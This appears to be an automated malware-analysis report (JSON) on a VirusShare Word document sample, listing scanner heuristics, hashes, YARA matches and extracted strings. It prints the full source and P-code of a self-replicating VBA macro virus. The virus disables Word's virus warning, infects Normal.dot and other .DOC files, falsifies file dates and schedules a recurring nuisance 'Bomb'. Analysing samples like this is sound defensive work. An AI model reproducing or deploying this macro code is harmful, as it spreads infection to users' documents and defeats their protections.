{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"Code\""
        ],
        "behavior": {
            "AutoClose": "Runs when the Word document is closed",
            "AutoExec": "Runs when the Word document is opened",
            "AutoExit": "Runs when the Word document is closed",
            "AutoNew": "Runs when a new Word document is created",
            "AutoOpen": "Runs when the Word document is opened",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code"
        },
        "macro": "\n\nSub AutoNew()\n    CopyVirCode\nEnd Sub\nSub AutoOpen()\n    CopyVirCode\nEnd Sub\nSub AutoExec()\n    CopyVirCode\nEnd Sub\nSub AutoClose()\n    CopyVirCode\nEnd Sub\nSub AutoExit()\n    CopyVirCode\nEnd Sub\nPrivate Sub CopyVirCode()\n    On Local Error Resume Next\n    RemoveProtection\n    If Not ActiveDocument = NormalTemplate Then 'Infetta Normal.dot\n        CopyVirCodeToModel\n    End If\n    If Not ActiveDocument = ThisDocument Then   'Infetta il documento aperto\n        CopyVirCodeToDocument ActiveDocument\n    End If\nEnd Sub\nPrivate Sub CopyVirCodeToModel()\n    On Local Error Resume Next\n    oldDate = Date\n    Date = FileDateTime(FileName)\n    With ActiveDocument\n        .UpdateStylesOnOpen = False\n        .AttachedTemplate = \"Normal.dot\"\n    End With\n    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=\"Code\", Object:=wdOrganizerObjectProjectItems\n    NormalTemplate.Save\n    Date = oldDate\nEnd Sub\nPrivate Sub CopyVirCodeToDocument(Target As Document)\n    On Local Error Resume Next\n    Set fs = Application.FileSearch\n    With fs\n     .LookIn = Target.Path\n     .FileName = \"*.DOC\"\n     If .Execute(SortBy:=msoSortByFileName, SortOrder:=msoSortOrderAscending) > 0 Then\n      Randomize\n      FileName = .FoundFiles(Int((.FoundFiles.Count * Rnd) + 1))\n      oldDate = Date\n      Date = FileDateTime(FileName)\n      Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=FileName, Name:=\"Code\", Object:=wdOrganizerObjectProjectItems\n      Date = oldDate\n     Else\n       Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=Target.FullName, Name:=\"Code\", Object:=wdOrganizerObjectProjectItems\n     End If\n    End With\n    Application.OnTime When:=Now + TimeValue(\"04:00:00\"), Name:=\"Normal.Code.Bomb\"\nEnd Sub\nPrivate Sub RemoveProtection()\n    'Disattiva il messaggio di avviso iniziale\n    Options.VirusProtection = False\nEnd Sub\nPrivate Sub Bomb()\n    On Local Error Resume Next\n    For Each myTask In Tasks\n     oldWindowState = ActiveWindow.WindowState\n    \n     myTask.WindowState = wdWindowStateMinimize\n     myTask.WindowState = wdWindowStateMaximize\n     myTask.WindowState = oldWindowState\n    Next myTask\n    Application.OnTime When:=Now + TimeValue(\"01:00:00\"), Name:=\"Normal.Code.Bomb\"\nEnd Sub\n\n' Processing file: VirusShare_23885fe6e32b0304a55193db18cfc8fc\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 903 bytes\n' Macros/VBA/Code - 4331 bytes\n' Line #0:\n' \tFuncDefn (Sub AutoNew())\n' Line #1:\n' \tArgsCall CopyVirCode 0x0000 \n' Line #2:\n' \tEndSub \n' Line #3:\n' \tFuncDefn (Sub AutoOpen())\n' Line #4:\n' \tArgsCall CopyVirCode 0x0000 \n' Line #5:\n' \tEndSub \n' Line #6:\n' \tFuncDefn (Sub AutoExec())\n' Line #7:\n' \tArgsCall CopyVirCode 0x0000 \n' Line #8:\n' \tEndSub \n' Line #9:\n' \tFuncDefn (Sub AutoClose())\n' Line #10:\n' \tArgsCall CopyVirCode 0x0000 \n' Line #11:\n' \tEndSub \n' Line #12:\n' \tFuncDefn (Sub AutoExit())\n' Line #13:\n' \tArgsCall CopyVirCode 0x0000 \n' Line #14:\n' \tEndSub \n' Line #15:\n' \tFuncDefn (Private Sub CopyVirCode())\n' Line #16:\n' \tOnError <crash> \n' Line #17:\n' \tArgsCall RemoveProtection 0x0000 \n' Line #18:\n' \tLd ActiveDocument \n' \tLd NormalTemplate \n' \tEq \n' \tNot \n' \tIfBlock \n' \tQuoteRem 0x0030 0x0012 \"Infetta Normal.dot\"\n' Line #19:\n' \tArgsCall CopyVirCodeToModel 0x0000 \n' Line #20:\n' \tEndIfBlock \n' Line #21:\n' \tLd ActiveDocument \n' \tLd ThisDocument \n' \tEq \n' \tNot \n' \tIfBlock \n' \tQuoteRem 0x0030 0x001B \"Infetta il documento aperto\"\n' Line #22:\n' \tLd ActiveDocument \n' \tArgsCall CopyVirCodeToDocument 0x0001 \n' Line #23:\n' \tEndIfBlock \n' Line #24:\n' \tEndSub \n' Line #25:\n' \tFuncDefn (Private Sub CopyVirCodeToModel())\n' Line #26:\n' \tOnError <crash> \n' Line #27:\n' \tLd Date \n' \tSt oldDate \n' Line #28:\n' \tLd FileName \n' \tArgsLd FileDateTime 0x0001 \n' \tSt Date \n' Line #29:\n' \tStartWithExpr \n' \tLd ActiveDocument \n' \tWith \n' Line #30:\n' \tLitVarSpecial (False)\n' \tMemStWith UpdateStylesOnOpen \n' Line #31:\n' \tLitStr 0x000A \"Normal.dot\"\n' \tMemStWith AttachedTemplate \n' Line #32:\n' \tEndWith \n' Line #33:\n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed Source \n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tParamNamed Destination \n' \tLitStr 0x0004 \"Code\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerCopy 0x0004 \n' Line #34:\n' \tLd NormalTemplate \n' \tArgsMemCall Save 0x0000 \n' Line #35:\n' \tLd oldDate \n' \tSt Date \n' Line #36:\n' \tEndSub \n' Line #37:\n' \tFuncDefn (Private Sub CopyVirCodeToDocument(Target As ))\n' Line #38:\n' \tOnError <crash> \n' Line #39:\n' \tSetStmt \n' \tLd Application \n' \tMemLd FileSearch \n' \tSet fs \n' Line #40:\n' \tStartWithExpr \n' \tLd fs \n' \tWith \n' Line #41:\n' \tLd Target \n' \tMemLd Path \n' \tMemStWith LookIn \n' Line #42:\n' \tLitStr 0x0005 \"*.DOC\"\n' \tMemStWith FileName \n' Line #43:\n' \tLd msoSortByFileName \n' \tParamNamed SortBy \n' \tLd msoSortOrderAscending \n' \tParamNamed SortOrder \n' \tArgsMemLdWith Execute 0x0002 \n' \tLitDI2 0x0000 \n' \tGt \n' \tIfBlock \n' Line #44:\n' \tArgsCall Read 0x0000 \n' Line #45:\n' \tMemLdWith FoundFiles \n' \tMemLd Count \n' \tLd Rnd \n' \tMul \n' \tParen \n' \tLitDI2 0x0001 \n' \tAdd \n' \tFnInt \n' \tArgsMemLdWith FoundFiles 0x0001 \n' \tSt FileName \n' Line #46:\n' \tLd Date \n' \tSt oldDate \n' Line #47:\n' \tLd FileName \n' \tArgsLd FileDateTime 0x0001 \n' \tSt Date \n' Line #48:\n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tParamNamed Source \n' \tLd FileName \n' \tParamNamed Destination \n' \tLitStr 0x0004 \"Code\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerCopy 0x0004 \n' Line #49:\n' \tLd oldDate \n' \tSt Date \n' Line #50:\n' \tElseBlock \n' Line #51:\n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tParamNamed Source \n' \tLd Target \n' \tMemLd FullName \n' \tParamNamed Destination \n' \tLitStr 0x0004 \"Code\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerCopy 0x0004 \n' Line #52:\n' \tEndIfBlock \n' Line #53:\n' \tEndWith \n' Line #54:\n' \tLd Now \n' \tLitStr 0x0008 \"04:00:00\"\n' \tArgsLd TimeValue 0x0001 \n' \tAdd \n' \tParamNamed When \n' \tLitStr 0x0010 \"Normal.Code.Bomb\"\n' \tParamNamed New \n' \tLd Application \n' \tArgsMemCall OnTime 0x0002 \n' Line #55:\n' \tEndSub \n' Line #56:\n' \tFuncDefn (Private Sub RemoveProtection())\n' Line #57:\n' \tQuoteRem 0x0004 0x0029 \"Disattiva il messaggio di avviso iniziale\"\n' Line #58:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt VirusProtection \n' Line #59:\n' \tEndSub \n' Line #60:\n' \tFuncDefn (Private Sub Bomb())\n' Line #61:\n' \tOnError <crash> \n' Line #62:\n' \tStartForVariable \n' \tLd myTask \n' \tEndForVariable \n' \tLd Tasks \n' \tForEach \n' Line #63:\n' \tLd ActiveWindow \n' \tMemLd WindowState \n' \tSt oldWindowState \n' Line #64:\n' Line #65:\n' \tLd wdWindowStateMinimize \n' \tLd myTask \n' \tMemSt WindowState \n' Line #66:\n' \tLd wdWindowStateMaximize \n' \tLd myTask \n' \tMemSt WindowState \n' Line #67:\n' \tLd oldWindowState \n' \tLd myTask \n' \tMemSt WindowState \n' Line #68:\n' \tStartForVariable \n' \tLd myTask \n' \tEndForVariable \n' \tNextVar \n' Line #69:\n' \tLd Now \n' \tLitStr 0x0008 \"01:00:00\"\n' \tArgsLd TimeValue 0x0001 \n' \tAdd \n' \tParamNamed When \n' \tLitStr 0x0010 \"Normal.Code.Bomb\"\n' \tParamNamed New \n' \tLd Application \n' \tArgsMemCall OnTime 0x0002 \n' Line #70:\n' \tEndSub \n"
    },
    "filename": "VirusShare_23885fe6e32b0304a55193db18cfc8fc",
    "filesize": 37376,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Title: epform10, Author: Microsoft Corporation, Template: Normal.dot, Last Saved By: Ditry PC, Revision Number: 5, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Wed Sep 17 11:18:00 1997, Last Saved Time/Date: Tue Jul 11 16:07:00 2000, Number of Pages: 2, Number of Words: 217, Number of Characters: 1238, Security: 0",
    "hashes": {
        "md5": "23885fe6e32b0304a55193db18cfc8fc",
        "sha1": "e8b494519e913238f92b4145b7bfe6acd7a97524",
        "sha256": "4c594669c1424e1f2b869a77b27783715a1f53f33f2ced3f98d1a26972b3b21d"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "epform10",
            "Wide World Importers Presents",
            "A Summer Concert",
            "Michael Rauh, Conductor",
            "May 7, 1994",
            "epform20",
            "Make plans now to attend our next concert, \"A Tribute to Mozart,\" on June 11. Director Michael Rauh steps down from the podium to perform as our featured harpsichord soloist.",
            "epform40",
            "Symphony No. 9\tDmitri Shostakovich",
            "Eight Folk Songs\tAnatol LiADOV",
            "Romeo & Juliet\tPeter Ilich TSchaikovsky",
            "epbord10",
            "Wide World Importers",
            "Interoffice Memo",
            "To:\tAll Subsidiary Managers",
            "From:\tAnne Gabor, General Manager",
            "Re:\tYearly Sales",
            "Date:\tJuly 15, 1994",
            "epbord20",
            "A Timeline for Clocks",
            "EMBED MSDraw   \\* mergeformat",
            "14th century",
            "15th century",
            "16th century",
            "17th century",
            "19th century",
            "20th century",
            "epbull10 and epbull20",
            "Precious stones",
            "Diamond",
            "Ruby and sapphire (forms of corundum)",
            "Emerald",
            "Semiprecious stones",
            "Amethyst",
            "Aquamarine",
            "Garnet",
            "Jade",
            "Moonstone",
            "Opal",
            "epstyl10",
            "Tour Details:  You arrive in Sydney at 7 P.M., in plenty of time to settle in and rest.",
            "An adventure is a dare you take personally. It's an opportunity that also involves some risk.  It is inspired by an age-old sort of challenge, and the tools it involves -- boats, planes, or snow.",
            "epfoot20",
            "Our store features diamonds, rubies, sapphires, and emeralds.",
            "  We also feature a large selection of amethyst, aquamarine, garnet, jade",
            ", moonstone, opal, quartz, topaz, tourmaline, and turquoise.",
            "Diamonds, rubies, sapphires, emeralds, and jade remain our biggest sellers.  We also have a substantial market for amethyst, aquamarine, and turquoise.",
            "epend",
            "We sell both cut and uncut preciousand semiprecious  gems.",
            "We have the region's largest selection of jade.",
            "/ =!",
            "MSDraw",
            "MrEd",
            "Microsoft Draw",
            "MrEd",
            "System",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "erences",
            "METAFILEPICT",
            "MrEd",
            "Microsoft Draw",
            "MrEd",
            "System",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "erences",
            "D&9aJ",
            "K K/?kQ",
            "D&9aJ",
            "K K/?kQp",
            "xS=K@",
            ",,,E",
            "ovvF",
            "6\u01f0S^?&pz\u05cfjV9O.Uwau'd}",
            "W:hh[Z}H",
            "THo5f",
            "?Sm8\"_Q",
            "\u0416O-G(\u01e0BR",
            "\u035bF\u031biO",
            "m4Ye'XDaVr1A!?",
            "H@\u02eb#",
            "E0U`[o3d",
            "c>yy<[A\u02f0\u06c10F\u06ce5crs~kn1",
            "iVVF",
            "C:\\WINDOWS\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "\u0650\t6\u04f5&",
            "C:\\WINDOWS\\TEMP\\VBE\\MSForms.EXD",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL",
            "Office",
            "Gq/EW",
            "\u0690\t6\u04f5&",
            "@HP LaserJet 4",
            "LPT1:",
            "HPPCL5MS",
            "HP LaserJet 4",
            "HP LaserJet 4",
            "MSUDN",
            "HP LaserJet 4",
            "HP LaserJet 4",
            "MSUDN",
            "HP LaserJet 4",
            "dowStateMinimize4a",
            "wdWindowStateMaximizeU",
            "_B_var_Datev",
            "_B_var_oldDate",
            "_B_var_FileNamer",
            "_B_var_fs",
            "Normal",
            "stdo",
            "G{000",
            "epform10",
            "Microsoft Corporation",
            "Normal.dot",
            "Ditry PC",
            "Microsoft Word 8.0",
            "VIRUS ROOM",
            "epform10",
            "Title",
            "_PID_GUID",
            " u2I",
            " u2I",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "5396b3818",
            "9396b381d",
            "\u0690\t6\u04f5&",
            "\u0690\t6\u04f5&",
            "Wordk",
            "Win16~",
            "Win32",
            "sample16",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Documentj",
            "Module1b",
            "Code",
            "AutoNew\\3",
            "CopyVirCode",
            "AutoOpen*",
            "AutoExec",
            "AutoClose",
            "AutoExit",
            "RemoveProtection.",
            "ActiveDocument\\",
            "NormalTemplateq",
            "CopyVirCodeToModelTF",
            "CopyVirCodeToDocuments",
            "oldDate",
            "FileDateTime",
            "FileNamej",
            "UpdateStylesOnOpen\t",
            "AttachedTemplate",
            "Application*",
            "OrganizerCopy",
            "SourceG",
            "FullName\u041e",
            "Destination\u043b",
            "wdOrganizerObjectProjectItems",
            "Save",
            "TargetF",
            "fsF]",
            "FileSearchD",
            "LookInP",
            "Path2",
            "ExecuteY",
            "SortByo",
            "msoSortByFileName",
            "SortOrder4",
            "msoSortOrderAscendingU",
            "FoundFiles",
            "Count0v",
            "RndR",
            "OnTimeT",
            "WhenoD",
            "Now%",
            "TimeValue",
            "Options",
            "VirusProtectionoD",
            "Bomb",
            "myTaskc{",
            "Tasks",
            "oldWindowState",
            "ActiveWindow+",
            "WindowState|",
            "wdWindowStateMinimize4a",
            "wdWindowStateMaximizeU",
            "t Of",
            "Infetta Normal.dot",
            "Infetta il documento aperto",
            "Normal.dot9",
            "Code",
            "*.DOC",
            "Code",
            "Code",
            "04:00:00$",
            "Normal.Code.Bomb",
            "Disattiva il messaggio di avviso iniziale",
            "01:00:00$",
            "Normal.Code.Bomb",
            "Attribut",
            "e VB_Nam",
            "e = \"Cod",
            "Sub ",
            "AutoNew(",
            "yVir",
            "POpeBn#RExec#RClose%Tit",
            ")Priva",
            "On Loca",
            "l Error ",
            "Resu",
            "t~Remove",
            "Protecti",
            "If No",
            "\tveDo",
            "malTempl",
            "9Then 'Infetta",
            "ToMMl",
            "6TXhis=",
            "l dKo aperto&:",
            "/eUoldD",
            "File",
            "Ti8me(",
            "5.Up",
            "Styles",
            "@dFals",
            "achedhCm",
            "Applica",
            ".Organi",
            "zepy So@urce:=KN.",
            "FullA-, D estin",
            ":=, ",
            "Obj:=wd",
            "ItemsC&L",
            "Sav:R",
            "Yo@(Targe@[s E",
            "/=erS",
            "fs@.%",
            "8S`earch#",
            " .LookIn`",
            ".Pat",
            " .e?",
            "\"*.DOC3 o. ",
            "(SortBy:=msoC",
            ",3rtOrder",
            "Ascendi",
            "ng) > 0 ",
            "  Rand",
            "s(InHt((",
            " * Rnd) + 1)D&  ",
            "\tU]  N",
            "QLBOL&",
            "Jd EIk",
            "on:=$Agh",
            "x\u02c5XznA W`at",
            "Value(\"04:00@",
            "p\"), $",
            ">de.BombR",
            "\u03a3M\u01c5'Disa",
            "tt mes",
            "saggio d",
            "i avvisoD i@ialyOpAs.us3",
            "oE`Q myTaxsk  9q",
            "Wi1wStC[N3",
            "Maxi",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "STDOLE2.",
            "TLB#",
            "tomation",
            "mMSFo@rms>",
            "FCBDC09",
            "89-5737-",
            "11D4-ACD",
            "9-900936`D3B52",
            "TWD#Micr@osoft ",
            "` Ob",
            " Library",
            "P1C797683",
            "41'PJP\\VB$E\\(EX(.",
            "CxRN@UalCxNTaQx",
            " +\t,C",
            "OfficDO@f",
            "G{2DF8",
            "D04C-5BF",
            "A-101B-BHDE5@AA@4",
            "2HPROGR",
            "AM FILES",
            "\\MICROSO",
            "FT OFFIC",
            "MSO970.DLLHk# 8",
            "BThi",
            "sDocumenDt",
            "@1TD",
            "h@6s",
            "DIcD",
            "Code",
            "d@OO",
            "ThisDocument",
            "Code",
            "ID=\"{471C8B8F-5745-11D4-ACDA-900936D3B526}\"",
            "Document=ThisDocument/&H00000000",
            "Module=Code",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"F3F13FD1AFD5AFD5AFD5AFD5\"",
            "DPB=\"5F5D934593DDFEDEFEDEFE\"",
            "GC=P",
            "\"CBC907F972FA72FA8D\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "*.DOC": "Word",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.336738",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
